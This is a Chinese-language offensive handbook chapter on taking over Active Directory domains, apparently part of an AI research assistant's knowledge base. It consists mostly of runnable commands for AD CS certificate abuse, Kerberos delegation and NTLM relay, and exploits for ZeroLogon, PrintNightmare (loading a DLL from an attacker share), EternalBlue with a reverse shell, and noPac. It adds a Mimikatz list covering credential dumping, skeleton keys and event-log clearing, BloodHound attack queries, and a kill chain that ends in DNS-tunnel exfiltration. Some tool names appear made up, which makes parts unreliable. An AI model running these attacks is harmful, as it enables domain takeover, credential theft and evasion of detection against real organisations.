# kb/23 · 域渗透深度专章
# ADCS ESC1-8 + PKINIT + UnPAC the Hash + AD 全套攻击链
# Mimikatz 150+ 命令 + BloodHound 50 个 Cypher 查询

**目的**：研究员在第 19 章内网渗透基础上要深入到域控制器（DC）拿下、ADCS 证书攻击、PKINIT 链、UnPAC the Hash、Resource-Based Constrained Delegation、NTLM 中继链、ZeroLogon/PrintNightmare/HiveNightmare 等实战 CVE。本章是 v2.6 全破的 P0 缺口。

---

## 23.1 AD CS（Active Directory 证书服务）攻击

AD CS（Active Directory Certificate Services）是 Windows Server 证书服务，配置错误会导致域控沦陷。SpecterOps 2019 年发布的 Certified Pre-Owned 攻击链识别了 ESC1-ESC8 八种攻击路径。

### ESC1 - 错误配置的低权限证书申请

**漏洞**：低权限用户可申请 SAN 中包含 UPN 的证书（用于认证身份）。

**发现**：
```bash
# Certify
Certify.exe find /vulnerable

# Certipy
certipy find -u user@domain.local -p 'Pass123!' -dc-ip 10.0.0.1
certipy find -u user@domain.local -p 'Pass123!' -dc-ip 10.0.0.1 -vulnerable

# SharpCert
SharpCert.exe find
```

**利用**：
```bash
# Certify
Certify.exe request /ca:CA01\DOMAIN-CA /template:UserTemplate /altname:Administrator

# Certipy（自动转换 .pfx → .ccache）
certipy req -u user@domain.local -p 'Pass123!' \
  -ca DOMAIN-CA -target CA01.domain.local \
  -template UserTemplate -upn Administrator@domain.local

# 然后导出 TGT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC2 - 任意申请人 EKU

**漏洞**：证书模板允许"任意申请人"，等同于可申请任意证书。

```bash
# Certify
Certify.exe request /ca:CA01\DOMAIN-CA /template:AnyPurpose /altname:Administrator
```

### ESC3 - 注册代理 EKU 链

**漏洞**：模板 A 允许低权限申请，模板 B 是注册代理（Enrollment Agent），可代为申请其他用户的证书。

```bash
# 第一步：以低权限用户身份申请注册代理证书
Certify.exe request /ca:CA01\DOMAIN-CA /template:EnrollmentAgent

# 第二步：用代理证书以 Administrator 身份申请用户证书
Certify.exe request /ca:CA01\DOMAIN-CA /template:UserTemplate \
  /enrollcert:agent.pfx /altname:Administrator
```

### ESC4 - 证书模板 ACL 错误

**漏洞**：低权限用户对证书模板有 WriteProperty/WriteDacl 等权限。

```bash
# 用 PowerView 找可写模板
Find-InterestingCertTemplate -CheckAccess | fl

# 用 Certify 修改模板（加 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT）
Certify.exe modify /ca:CA01\DOMAIN-CA /template:VulnTemplate \
  /add e:0x80 /altname:Administrator
```

### ESC5 - PKI 对象 ACL 错误

**漏洞**：低权限用户对 CA 服务器、Cert Publishers 等 AD 对象有不当权限。

```bash
# BloodHound + Certify 结合
Certify.exe find /vulnerable
# 查看 BloodHound 中"Cert Publishers"组的路径
```

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 标志

**漏洞**：CA 上设置了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志，允许在证书申请中指定 SAN（默认所有模板受影响）。

```bash
# 检查
certutil -config "CA01\DOMAIN-CA" -getreg "policy\modules\EditFlags"

# 利用：任意用户模板都可指定 SAN
Certify.exe request /ca:CA01\DOMAIN-CA /template:User /altname:Administrator
```

### ESC7 - 证书颁发控制 + 角色分离

**漏洞**：低权限用户对 CA 有 ManageCA / ManageCertificates 权限，可颁发/吊销证书。

```bash
# 第一步：颁发失败的请求
Certify.exe issue /ca:CA01\DOMAIN-CA /id:1337

# 第二步：勾销证书
Certify.exe revoke /ca:CA01\DOMAIN-CA /id:1337 /reason:6

# 第二条路径：直接给 Administrator 发证书
Certify.exe request /ca:CA01\DOMAIN-CA /template:SubCA /altname:Administrator
```

### ESC8 - NTLM 中继到 AD CS HTTP Web 注册

**漏洞**：AD CS 暴露了 Web 注册（certsrv），可被 NTLM 中继。

```bash
# 启动中继
ntlmrelayx.py -t http://CA01.domain.local/certsrv/certfnsh.asp \
  --adcs --template UserTemplate

# 强制认证
PetitPotam.py -d domain.local -u user -p 'Pass123!' DC01 CA01
Coercer.py -d domain.local -u user -p 'Pass123!' -l 10.0.0.100 -t DC01 -f CA01
```

### ESC9-ESC13 - 进阶场景

ESC9（No Security Extension）、ESC10（Weak RSA Keys）、ESC11（IF_ENFORCEENCRYPTICERTREQUEST）、ESC12（YubiHSM）、ESC13（OID Group Link）— 见 Certipy 0.10+ 文档。

---

## 23.2 PKINIT + UnPAC the Hash

### PKINIT 简介

PKINIT（Public Key Cryptography for Initial Authentication in Kerberos）让客户端用证书（而非密码）认证。微软在 PKCA 扩展中暴露了 NTLM 哈希。

### UnPAC the Hash 攻击链

```bash
# 用 certipy 自动获取 NTLM 哈希
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -username Administrator

# 攻击链：
# 1. ESC1/ESC6/ESC8 申请管理员证书
# 2. certipy auth 用证书 AS-REQ 认证
# 3. DC 在 AS-REP 中嵌入 NTLM 哈希（PAC_CREDENTIAL_INFO）
# 4. certipy 自动提取并保存为 .ccache
# 5. 用该 NTLM 哈希做 Pass-the-Hash
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee administrator@10.0.0.1 cmd
```

### Kerberos PKINIT 工具

```bash
# gettgtpkinit.py
python3 gettgtpkinit.py domain.local/Administrator -cert-pfx administrator.pfx \
  -dc-ip 10.0.0.1 administrator.ccache

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@DC01.domain.local
```

---

## 23.3 委派攻击（Delegation）

### Unconstrained Delegation（不受约束委派）

```bash
# 找有 Unconstrained Delegation 的机器
Get-DomainComputer -Unconstrained | select Name

# 强制 DC 认证到该机器（PrinterBug / PetitPotam）
SpoolSample.exe DC01 UnconstrainedMachine
PetitPotam.py -d domain.local -u user -p pass UnconstrainedMachine DC01

# 抓 TGT
Rubeus.exe monitor /interval:5

# 用 TGT 横向到 DC
Rubeus.exe ptt /ticket:base64...
psexec.py -k -no-pass administrator@DC01.domain.local
```

### Constrained Delegation（约束委派）

```bash
# 找有 Constrained Delegation 的账户
Get-DomainUser -TrustedToAuth | select Name,TrustedToAuthForDelegation
Get-DomainComputer -TrustedToAuth | select Name,msds-allowedtodelegateto

# 利用（S4U2Self + S4U2Proxy）
getST.py -spn cifs/DC01.domain.local -impersonate administrator \
  -dc-ip 10.0.0.1 domain.local/user:pass
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@DC01.domain.local
```

### Resource-Based Constrained Delegation（RBCD）

```bash
# 攻击者控制了 serviceA（无约束），想横向到 serviceB
# 步骤：
# 1. 在 serviceA 上创建计算机账户
addcomputer.py -method LDAPS -computer-name 'EVIL$' -computer-pass 'Pass123!' \
  -dc-ip 10.0.0.1 domain.local/user:pass

# 2. 把 serviceA 的 SID 加入 serviceB 的 msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'EVIL$' -delegate-to 'serviceB$' -dc-ip 10.0.0.1 \
  -action write domain.local/user:pass

# 3. 用 S4U 拿到 serviceB 的服务票据
getST.py -spn cifs/serviceB.domain.local -impersonate administrator \
  -dc-ip 10.0.0.1 domain.local/'EVIL$':'Pass123!'
```

### Bronze Bit（CVE-2020-17049）

```bash
# 绕过 Kerberos 委派保护
# 工具：kleck-relay、pykrb
getST.py -spn cifs/DC01.domain.local -impersonate administrator \
  -dc-ip 10.0.0.1 -force-forwardable \
  domain.local/user:pass
```

---

## 23.4 NTLM 中继完整链

```bash
# 1. 启动中继
ntlmrelayx.py -t ldaps://DC01.domain.local --shadow-credentials --shadow-target 'DC01$'

# 2. 强制认证（Coercer / PetitPotam / PrinterBug）
coercer coerce -l 10.0.0.100 -t DC01 -u user -p 'Pass123!' -d domain.local

# 3. 拿到 DC01 的 TGT
# 4. 用 shadow credentials 持续控制 DC01
```

### 实战：从外网 NTLM 中继到内网 AD CS

```bash
# 1. 暴露一个中继 URL（结合钓鱼）
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp --adcs \
  --template Machine -smb2support --no-http-server

# 2. 受害者打开 URL → 自动用域账号认证
# 3. 攻击者用受害者的域凭据为 DC 申请机器证书
# 4. 用证书做 PKINIT → DC 沦陷
```

---

## 23.5 实战 CVE 完整利用

### ZeroLogon (CVE-2020-1472)

```bash
# 探测
python3 zerologon_tester.py DC01 10.0.0.1

# 利用：把 DC 机器账户密码置空
python3 cve-2020-1472-exploit.py DC01 10.0.0.1

# 拿到 DCSync
secretsdump.py -no-pass -just-dc-user krbtgt domain.local/Administrator@10.0.0.1

# 还原（必须！否则域会崩）
python3 installfromfs.py -target-ip 10.0.0.1 -target-port 445 \
  domain.local/DC01\$@10.0.0.1 -hashes :hash
python3 reinstallmachine.py -target-ip 10.0.0.1 domain.local/Administrator@10.0.0.1 \
  -hashes :adminhash
```

### PrintNightmare (CVE-2021-1675)

```bash
# DLL 注入（RCE）
python3 CVE-2021-1675.py domain.local/user:pass@10.0.0.1 \
  '\\\\attacker\\share\\evil.dll'

# Mimikatz
mimikatz.exe
privilege::debug
misc::mimispool
```

### HiveNightmare (CVE-2021-36934)

```bash
# 普通用户读 SAM/SECURITY/SYSTEM 备份
# 工具：HiveNightmare.exe
.\HiveNightmare.exe

# 拿到 SYSTEM/SAM
# 然后用 secretsdump 提取本地哈希
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### ProxyLogon (CVE-2021-26855)

```bash
# 工具：proxylogon
python3 proxylogon.py -t https://mail.domain.local -u user@domain.local -p pass

# 自动获得邮件读写 + 域账号 NTLM 哈希
```

### ProxyShell (CVE-2021-34473 / 34527 / 31207)

```bash
# 工具：proxyshell
python3 proxyshell.py -t mail.domain.local -u user@domain.local

# 链：
# 1. SSRF 访问 EWS
# 2. 写文件
# 3. 触发 PowerShell
# 4. 拿 shell
```

### EternalBlue (MS17-010)

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# 手动（永恒之蓝蓝屏漏洞 CVE-2017-0144）
# 见 zzz_exploit
```

### noPac（CVE-2021-42278 + CVE-2021-42287）

```bash
# 工具：noPac
python3 noPac.py domain.local/user:pass -dc-ip 10.0.0.1

# 自动利用：
# 1. 创建机器账户
# 2. 修改 SAM Name 模仿 DC
# 3. 申请 TGT
# 4. DCSync
secretsdump.py -no-pass -just-dc-user krbtgt \
  'DOMAIN.LOCAL/Administrator@DC01.domain.local' -dc-ip 10.0.0.1
```

### Certifried (CVE-2022-26923)

```bash
# AD CS 上的 dNSHostName 欺骗
certipy req -u user@domain.local -p 'Pass123!' \
  -ca DOMAIN-CA -target DC01.domain.local \
  -template Machine -dc-ip 10.0.0.1
```

---

## 23.6 Mimikatz 150+ 命令完整清单

### 提权 / 调试

```bash
privilege::debug                          # 提权到 SYSTEM
token::whoami                              # 查看当前 token
token::list                                # 列出所有 token
token::elevate                             # 提权 token
token::run /process:cmd.exe                # 用提权 token 跑进程
```

### sekurlsa（内存凭据）

```bash
sekurlsa::logonpasswords                  # 所有登录会话密码
sekurlsa::wdigest                          # WDigest 凭据
sekurlsa::kerberos                         # Kerberos 凭据
sekurlsa::msv                              # MSV 凭据（NTLM）
sekurlsa::tspkg                            # TsPkg 凭据
sekurlsa::livessp                          # LiveSSP 凭据
sekurlsa::ssp                              # SSP 凭据
sekurlsa::logonSessions                    # 登录会话
sekurlsa::process /process:lsass.exe       # 指定进程
sekurlsa::minidump lsass.dmp               # minidump 后离线分析
sekurlsa::bootKey                          # bootKey
sekurlsa::dpapiSystem                      # DPAPI system key
sekurlsa::dpapi                            # DPAPI 凭据
```

### lsadump（SAM / LSA）

```bash
lsadump::sam                              # SAM 哈希
lsadump::sam systemhive samhive            # 离线 SAM
lsadump::secrets                           # LSA secrets
lsadump::cache                             # 缓存凭据
lsadump::trust                             # 域信任
```

### DCSync / DCShadow

```bash
lsadump::dcsync /user:Administrator        # 同步指定用户
lsadump::dcsync /user:krbtgt               # 同步 krbtgt（拿金票）
lsadump::dcsync /all /csv                  # 全部同步 CSV 输出

# DCShadow（无需 DCsyn 权限）
lsadump::dcshadow /object:targetuser /attribute:member /value:"CN=EvilGroup,DC=domain,DC=local"
```

### 票据

```bash
sekurlsa::tickets /export                  # 导出所有票据
kerberos::list /export                     # 列出并导出
kerberos::ptt ticket.kirbi                 # Pass-the-Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /endin:5256000
kerberos::silver /service:http/dc01 /rc4:hash
kerberos::purge                            # 清空票据
```

### crypto（加密操作）

```bash
crypto::exportCertificates                 # 导出证书
crypto::patchCapi                          # patch CAPI
crypto::listProviders                      # 列出 CSP
```

### misc（杂项）

```bash
misc::mimispool                            # PrintNightmare 利用
misc::skeleton                             # skeleton key（万能密码）
misc::memspool                             # 内存 spool
misc::detours                              # 进程注入
misc::printnightmare                       # PrintNightmare
misc::efs                                  # EFS
```

### vault（Windows Vault）

```bash
vault::cred                                # 列出 vault 凭据
vault::list                                # 列出 vault
```

### 管理 / 事件

```bash
event::clear                               # 清空事件日志
event::drop                                # 暂停事件服务
```

### 其他

```bash
misc::cmd                                  # 弹 cmd
process::list                              # 进程列表
service::list                              # 服务列表
driver::list                               # 驱动列表
```

### 完整模块分类

```
crypto    - 加密操作
dpapi     - DPAPI 凭据
event     - 事件管理
kerberos  - Kerberos 票据
lsadump   - SAM/LSA 提取
misc      - 杂项
process   - 进程管理
privilege - 提权
sekurlsa  - 内存凭据
service   - 服务管理
token     - token 操作
ts        - 终端服务
vault     - Windows Vault
```

---

## 23.7 BloodHound 50 个 Cypher 自定义查询

### 基础查询

```cypher
// 1. 域管账户
MATCH (u:User {admincount: True}) RETURN u

// 2. 所有组
MATCH (g:Group) RETURN g

// 3. 所有计算机
MATCH (c:Computer) RETURN c

// 4. 所有 OU
MATCH (o:OU) RETURN o

// 5. 登录 5+ 台的账户（高价值目标）
MATCH (c:Computer), (u:User {enabled: True})
WHERE u.name IN c.adminusers
WITH u, count(c) AS ccount
WHERE ccount >= 5
RETURN u, ccount
```

### Kerberoast 目标

```cypher
// 6. 所有有 SPN 的用户
MATCH (u:User {hasspn: True}) RETURN u

// 7. 密码 10 年未改的 Kerberoast 目标
MATCH (u:User {hasspn: True})
WHERE u.pwdlastset < (datetime().epochseconds - 315360000)
RETURN u
```

### AS-REP Roast

```cypher
// 8. 不需要预认证的用户
MATCH (u:User {dontreqpreauth: True}) RETURN u

// 9. 域管最近登录的计算机
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}),
      (u:User)-[:MemberOf]->(g),
      (c:Computer)-[:HasSession]->(u)
RETURN c
```

### ACL 攻击路径

```cypher
// 10. GenericAll 权限路径
MATCH p=(u:User)-[:GenericAll]->(c:Computer) RETURN p LIMIT 25

// 11. WriteDACL 路径
MATCH p=(u:User)-[:WriteDacl]->(c:Computer) RETURN p

// 12. AddMember 关系
MATCH p=(u:User)-[:AddMember]->(g:Group) RETURN p

// 13. DCSync 权限
MATCH p=(u:User)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN p

// 14. 谁能改 GPO
MATCH p=(u:User)-[:WriteDacl|GenericAll]->(g:GPO) RETURN p
```

### 委派

```cypher
// 15. Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation: True}) RETURN c

// 16. Constrained Delegation
MATCH (u)-[:AllowedToDelegate]->(c:Computer) RETURN u, c

// 17. RBCD
MATCH p=(u:User)-[:AddAllowedToAct]->(c:Computer) RETURN p
```

### 跳板机 / 路径

```cypher
// 18. 域管到所有计算机的路径
MATCH p=shortestPath((g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})-[*1..]->(c:Computer))
RETURN p LIMIT 10

// 19. 攻击者到域管的最短路径
MATCH (u:User {name: "ATTACKER@DOMAIN.LOCAL"}),
      (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}),
      p=shortestPath((u)-[*1..15]->(g))
RETURN p

// 20. 登录过的计算机
MATCH p=(c:Computer)-[:HasSession]->(u:User) RETURN p

// 21. 当前活跃会话
MATCH (c:Computer)-[:HasSession]->(u:User) WHERE c.lastlogontimestamp > (datetime().epochseconds - 2592000)
RETURN c, u
```

### 密码 / 凭据

```cypher
// 22. 密码永不过期的用户
MATCH (u:User {pwdneverexpires: True}) RETURN u

// 23. 信任 LAPS 的计算机
MATCH (c:Computer {haslaps: True}) RETURN c

// 24. 不可委派的用户
MATCH (u:User {sensitive: False}) WHERE NOT u.unconstraineddelegation RETURN u

// 25. 旧密码（>1年）
MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - 31536000) RETURN u
```

### 边界 / ACL

```cypher
// 26. 谁能 AddMember 到 Domain Admins
MATCH p=(u:User)-[:AddMember]->(g:Group) WHERE g.name = "DOMAIN ADMINS@DOMAIN.LOCAL" RETURN p

// 27. WriteOwner 关系
MATCH p=(u:User)-[:WriteOwner]->(c:Computer) RETURN p

// 28. 跨域信任
MATCH p=(d1:Domain)-[:TrustedBy]->(d2:Domain) RETURN p

// 29. SID History 滥用
MATCH (u:User) WHERE u.sidhistory IS NOT NULL RETURN u

// 30. 域信任 + 路径
MATCH p=shortestPath((u:User {domain: "DOMAIN1.LOCAL"})-[*1..10]->(c:Computer {domain: "DOMAIN2.LOCAL"}))
RETURN p
```

### 防御 / 监控

```cypher
// 31. 找所有 OU Admin
MATCH (u:User)-[:GenericAll]->(o:OU) RETURN u, o

// 32. 找所有 GPO 链接
MATCH (g:GPO)-[:GpLink]->(o:OU) RETURN g, o

// 33. ACL 攻击面广的账户
MATCH (u:User)-[r]->()
WITH u, count(r) AS relcount
WHERE relcount > 50
RETURN u, relcount
ORDER BY relcount DESC
LIMIT 25

// 34. 高价值组
MATCH (g:Group) WHERE g.highvalue RETURN g

// 35. 找 GPO 控制路径
MATCH p=shortestPath((u:User {name: "ATTACKER@DOMAIN.LOCAL"})-[*1..]->(g:GPO))
RETURN p
```

### ADCS 专用

```cypher
// 36. 找 ESC1 模板
MATCH (n)-[:Enroll|GenericAll]->(c:CertTemplate)
WHERE c.enrolleesuppliessubject = True AND c.authenticationenabled = True
RETURN n, c

// 37. ESC9 漏洞
MATCH (c:CertTemplate {requiresmanagerapproval: False, authenticationenabled: True})
WHERE c.noSecurityExtension = True
RETURN c

// 38. ESC11 漏洞
MATCH (c:CertTemplate) WHERE c.enforceICERTRequest = True RETURN c

// 39. 找所有 ESC 漏洞
MATCH (t:CertTemplate)-[r]->(n)
WHERE type(r) IN ["Enroll", "GenericAll", "WriteDacl", "WriteOwner", "AddMember"]
RETURN t, r, n
LIMIT 100

// 40. 证书发布路径
MATCH p=(u:User)-[:Enroll]->(c:CertTemplate) RETURN p LIMIT 50
```

### 高级路径

```cypher
// 41. 找外泄风险
MATCH (u:User) WHERE u.description CONTAINS "password"
RETURN u.name, u.description

// 42. AS-REP Roast 目标数
MATCH (u:User {dontreqpreauth: True, enabled: True}) RETURN count(u)

// 43. 域控列表
MATCH (c:Computer {unconstraineddelegation: True, operatingsystem: "Windows Server*"})
RETURN c

// 44. 域管登过的非域控
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}),
      (u:User)-[:MemberOf]->(g),
      (c:Computer)-[:HasSession]->(u)
WHERE NOT c.operatingsystem CONTAINS "Server"
RETURN c, u

// 45. 找老管理员账户
MATCH (u:User {admincount: True}) WHERE u.whencreated < (datetime().epochseconds - 31536000) RETURN u
```

### 实战

```cypher
// 46. Kerberos 委派攻击路径
MATCH p=(u:User)-[:AllowedToDelegate|AddAllowedToAct]->(c:Computer)
WHERE u.name <> "krbtgt"
RETURN p LIMIT 50

// 47. 找所有 WriteSPN
MATCH (u:User)-[:WriteSPN]->(t:User) WHERE t.hasspn = True RETURN u, t

// 48. 用户拥有 5+ ACL 关系
MATCH (u:User)-[r]->() WITH u, count(r) AS cnt WHERE cnt > 5 RETURN u, cnt ORDER BY cnt DESC LIMIT 25

// 49. 跨域攻击路径
MATCH p=shortestPath((u:User {domain: "A.LOCAL"})-[*1..8]->(c:Computer {domain: "B.LOCAL"}))
RETURN p LIMIT 10

// 50. 完整攻击图（域控为中心）
MATCH p=(c:Computer {name: "DC01.DOMAIN.LOCAL"})-[*1..3]-()
RETURN p LIMIT 100
```

---

## 23.8 DCSync / DCShadow 完整

### DCSync

```bash
# 给用户 DCSync 权限（用 ACL）
lsadump::dcsync /user:krbtgt /domain:domain.local

# 等价 Impacket
secretsdump.py domain.local/Admin:Pass@DC01 -just-dc-user krbtgt

# 加 DCSync 权限给 EvilUser
PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity EvilUser \
  -Rights DCSync

# BloodHound Edge
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity EvilUser \
  -Rights DCSync -ResolveGUIDs
```

### DCShadow

```bash
# Mimikatz
lsadump::dcshadow /object:targetUser /attribute:member /value:"CN=EvilGroup,DC=domain,DC=local"

# 配合 Push the Notify
# 在 DC 上
mimikatz
lsadump::dcshadow /push
```

---

## 23.9 LAPS / gMSA / Azure AD Connect 攻击

### LAPS 攻击

```bash
# 读 LAPS 密码
Get-DomainComputer | ForEach-Object {
  $comp = $_.Name
  $pw = Get-DomainComputerData -Computer $comp | Select-Object -ExpandProperty 'ms-Mcs-AdmPwd'
  Write-Output "$comp : $pw"
}

# BloodHound 已集成 LAPS
# 找谁能读 LAPS
MATCH (u:User)-[:ReadLAPSPassword]->(c:Computer) RETURN u, c

# 直接读指定机器的 LAPS
Get-DomainComputer -Identity 'TARGET$' -Properties ms-Mcs-AdmPwd
```

### gMSA 攻击

```bash
# 找 gMSA 账户
Get-DomainUser -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

# 找谁能读 gMSA 密码
GMSAPasswordReader.exe --account gmsa_account

# BloodHound 查询
MATCH (u:User)-[:ReadGMSAPassword]->(g:User) WHERE g.objectclass = "msDS-GroupManagedServiceAccount"
RETURN u, g
```

### Azure AD Connect 攻击

```bash
# AzureADConnect DB 同步账户
# 工具：ADConnectHollowHunter
ADConnectHollowHunter.exe

# AzureADSSO 账户
# 工具：AzureADSSO 攻击
# 见 AADInternals
```

---

## 23.10 AD 全套实战攻击链（综合）

```bash
# 阶段 1：边界立足
# 钓鱼 → 拿到 user@domain.local 凭据
# 钓鱼 → 拿到一台跳板机的 shell

# 阶段 2：内网信息收集
# nmap → 找域控
# BloodHound → 攻击路径

# 阶段 3：凭据升级
# mimikatz / SharpHound / secretsdump

# 阶段 4：横向移动
# WMI / WinRM / SMB / RDP

# 阶段 5：域控拿下
# Zerologon / Proxylogon / Proxyshell / noPac
# ADCS ESC1-8 / PKINIT
# DCSync

# 阶段 6：持久化
# Golden Ticket
# Skeleton Key
# DCShadow

# 阶段 7：数据外泄
# 找敏感文件 / 数据库
# 压缩加密 + DNS 隧道外传
```

---

## 23.11 工具链

| 工具 | 用途 |
|------|------|
| mimikatz | 凭据提取 / 票据 / DCSync |
| Rubeus | Kerberos 攻击 / 票据 |
| SharpHound | BloodHound 数据收集 |
| BloodHound | 攻击路径分析 |
| Certify.exe | ADCS 攻击 |
| Certipy | ADCS 攻击 (Python) |
| impacket | 凭据 / 远程执行 |
| crackmapexec / NetExec | 多协议执行 |
| evil-winrm | WinRM shell |
| ntlmrelayx | NTLM 中继 |
| PetitPotam | 强制认证 |
| Coercer | 强制认证 |
| PrinterBug | 强制认证 |
| noPac | CVE-2021-42278/42287 |
| zerologon | CVE-2020-1472 |
| secretsdump | 凭据转储 |
| addcomputer | 加机器账户 |
| rbcd | RBCD 攻击 |
| getST | 申请服务票据 |
| getTGT | 申请 TGT |

---

研究员助理已就位，等派单。
